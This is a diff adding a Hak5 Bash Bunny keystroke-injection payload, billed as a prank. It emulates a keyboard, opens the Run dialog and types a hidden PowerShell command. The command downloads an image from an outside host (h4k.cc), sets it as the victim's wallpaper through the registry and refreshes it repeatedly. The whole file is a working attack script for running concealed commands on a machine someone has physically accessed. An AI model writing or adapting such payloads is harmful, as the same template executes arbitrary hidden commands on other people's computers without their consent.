@@ -1,0 +1,14 @@
+# Wallpaper Changer OF DOOM!!!!
+# Author: Hak5Darren
+# Props: Alex Goat
+# Demo: Hak5 episode 2502 - https://youtu.be/f3C58OKOsuo
+# Target: Windows Vista+
+# Category: Prank
+
+LED SETUP
+ATTACKMODE HID
+LED ATTACK
+Q GUI r
+Q DELAY 500
+Q STRING "powershell -w h \"\$p=\$home+'\b.jpg';iwr h4k.cc/b.jpg -O \$p;SP 'HKCU:Control Panel\Desktop' WallPaper \$p;1..59|%{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}""
+Q ENTER
